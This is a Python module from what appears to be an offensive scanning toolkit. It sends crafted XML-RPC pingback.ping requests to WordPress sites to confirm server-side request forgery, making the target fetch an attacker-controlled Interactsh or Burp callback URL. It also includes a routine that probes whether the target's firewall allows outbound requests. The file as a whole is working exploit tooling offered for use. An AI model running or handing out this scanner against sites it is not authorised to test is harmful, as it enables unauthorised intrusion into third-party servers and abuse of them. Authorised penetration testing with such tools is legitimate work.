#!/usr/bin/env python3
"""
Module: WP-PingBack-Scanner (Smart Calibration Edition)
Author: Sanchez (The Architect)
Purpose: [HUNTING WORDPRESS SSRF]
"""

import argparse
import sys
import os
import re
from colorama import Fore, Style, init

# Initialize colors
init(autoreset=True)

# ———— 1. THE CONNECTION ————
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))

# ———— 2. THE IMPORTS ————
from core import engine, logger, config, get_banner, Requester

# ———— 3. THE BRAIN ————
def check_vulnerability(payload: str, base_url: str) -> str | None:
    """
    The Logic Function.
    INPUT: A path to xmlrpc.php (payload) and the target URL.
    OUTPUT: A success string (if vuln found) or None (if safe).
    """
    req = Requester()
    
    # A. Build the Target
    if base_url.endswith("/") and payload.startswith("/"):
        target = f"{base_url}{payload[1:]}"
    elif not base_url.endswith("/") and not payload.startswith("/"):
        target = f"{base_url}/{payload}"
    else:
        target = f"{base_url}{payload}"

    # Retrieve the callback URL
    callback_url = getattr(config, "CALLBACK_URL", None)
    if not callback_url:
        return f"{Fore.RED}ERROR: No callback URL provided.{Style.RESET_ALL}"

    # B. The Payload
    xml_data = f"""<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
      <methodName>pingback.ping</methodName>
      <params>
        <param><value><string>{callback_url}</string></value></param>
        <param><value><string>{target}</string></value></param>
      </params>
    </methodCall>
    """

    # C. Fire the Shot
    try:
        res = req.post(
            target, 
            data=xml_data, 
            headers={"Content-Type": "text/xml"}
        )
    except Exception:
        return None 

    if not res:
        return None

    # D. Analyze the Result
    if "<methodResponse>" in res.text and res.status_code in (200, 500):
        
        if "faultCode" in res.text:
            fault_code = re.search(r"<int>(\d+)</int>", res.text)
            code = fault_code.group(1) if fault_code else "unknown"

            # ———— FAULT CODE ANALYSIS ————
            if code == "17":
                return f"{Fore.RED}SSRF CONFIRMED – FULLY BLIND OOB EXECUTION{Style.RESET_ALL} → {target}\n" \
                       f"   Fault 17 = Target fetched your callback but found no linkback → PURE SSRF SUCCESS!"
            
            elif code == "0":
                return f"{Fore.RED}SSRF CONFIRMED – FULL CALLBACK SUCCESS (Code 0){Style.RESET_ALL} → {target}\n" \
                       f"   Target accepted and processed your URL cleanly → Check Interactsh Client!"
            
            elif code == "48":
                return f"{Fore.MAGENTA}SSRF + LOGIC EXECUTION CONFIRMED{Style.RESET_ALL} → {target}\n" \
                       f"   Fault 48 = Pingback already registered → DB query executed → Beyond SSRF: Logic Triggered"

            return f"{Fore.YELLOW}XML-RPC Active (Fault Code: {code}){Style.RESET_ALL} → {target}"

        if "pingback.ping" in res.text or "success" in res.text.lower():
            return f"{Fore.GREEN}XML-RPC Pingback Likely Vulnerable (Generic Success){Style.RESET_ALL} → {target}"

    if res.status_code == 405:
        return f"{Fore.CYAN}XML-RPC Exists (405 - POST blocked){Style.RESET_ALL} → {target}"

    return None

# ———— 4. THE CALIBRATION (New Feature) ————
def calibrate_waf(base_url: str):
    """
    Runs a test against google.com to check WAF permeability.
    """
    print(f"{Fore.BLUE}[*] Running WAF Calibration (Decoy: google.com)...{Style.RESET_ALL}")
    
    # We temporarily hijack the logic
    req = Requester()
    target = f"{base_url}/xmlrpc.php" if not base_url.endswith("/") else f"{base_url}xmlrpc.php"
    decoy_url = "http://google.com"
    
    xml_data = f"""<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
      <methodName>pingback.ping</methodName>
      <params>
        <param><value><string>{decoy_url}</string></value></param>
        <param><value><string>{target}</string></value></param>
      </params>
    </methodCall>
    """

    try:
        res = req.post(target, data=xml_data, headers={"Content-Type": "text/xml"})
    except Exception as e:
        logger.error(f"Calibration failed (Network Error): {e}")
        return

    if not res:
        logger.error("Calibration failed (No Response)")
        return

    # ———— DIAGNOSTICS ————
    if res.status_code == 403 or res.status_code == 406:
        print(f"{Fore.RED}[!] CRITICAL: WAF BLOCK DETECTED ({res.status_code}){Style.RESET_ALL}")
        print(f"    The WAF hates the XML structure. Interactsh/Burp will likely fail too.")
        print(f"    Reason: Signature Block on POST body.")
    
    elif res.status_code == 404:
        print(f"{Fore.YELLOW}[!] WARN: /xmlrpc.php not found (404).{Style.RESET_ALL}")
        print(f"    The default path is missing. The scan might fail unless you find the custom path.")

    elif "<int>17</int>" in res.text:
        print(f"{Fore.GREEN}[+] SUCCESS: Calibration Passed!{Style.RESET_ALL}")
        print(f"    Target fetched Google.com (Fault 17). Outbound traffic is ALLOWED.")
        print(f"    {Style.BRIGHT}TACTICAL NOTE:{Style.RESET_ALL} If Interactsh fails later, your domain is burnt.")
    
    elif "<int>0</int>" in res.text:
        print(f"{Fore.GREEN}[+] SUCCESS: Calibration Passed (Fault 0)!{Style.RESET_ALL}")
        
    else:
        print(f"{Fore.CYAN}[?] UNKNOWN RESPONSE: {res.status_code}{Style.RESET_ALL}")
        print(f"    Response snippet: {res.text[:100]}")

    print("-" * 50)


# ———— 5. THE MANAGER (CLI) ————
def get_arg_parser() -> argparse.ArgumentParser:
    desc = get_banner("WP-XMLRPC-SMART")
    parser = argparse.ArgumentParser(description=desc, formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--callback", required=True, help="Your Interactsh/Burp URL")
    
    # The New Tactic
    parser.add_argument("--calibrate", action="store_true", help="Run a Control Test (Google.com) first to check WAF")

    parser.add_argument("-t", "--threads", type=int, default=5, help="Threads")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay")
    parser.add_argument("--header", action="append", default=[], help="Custom Headers")

    return parser

# ———— 6. THE KICKOFF ————
def main():
    parser = get_arg_parser()
    args = parser.parse_args()
    print(get_banner("WP-XMLRPC"))

    # A. Run Calibration if requested
    if args.calibrate:
        calibrate_waf(args.url)
        # We don't exit, we proceed to the main scan using the user's real payload.
        input(f"Press {Fore.YELLOW}ENTER{Style.RESET_ALL} to continue with main scan (or Ctrl+C to abort)...")

    # B. Configure the Engine
    object.__setattr__(config, "THREADS", args.threads)
    object.__setattr__(config, "DELAY", args.delay)
    object.__setattr__(config, "CALLBACK_URL", args.callback)

    headers = {}
    if args.header:
        for h in args.header:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()
    object.__setattr__(config, "CUSTOM_HEADERS", headers)

    payloads = [
        "/xmlrpc.php", "/blog/xmlrpc.php", "/wp/xmlrpc.php",
        "/wordpress/xmlrpc.php", "/wp-content/xmlrpc.php", "/old/xmlrpc.php"
    ]
    
    logger.info(f"Loaded {len(payloads)} internal paths.")
    logger.info(f"Starting Scan on {args.url} -> Callback: {args.callback}")
    
    hits = engine.run(
        task_function=check_vulnerability, 
        targets=payloads,
        base_url=args.url,
        desc="Checking Common Paths..."
    )

    if hits:
        print()
        logger.info(f"🔥 FOUND {len(hits)} POTENTIAL ENTRY POINTS!")
        for hit in hits:
            print(f"   {hit}")
    else:
        logger.info("✅ Target seems safe.")

if __name__ == "__main__":
    main()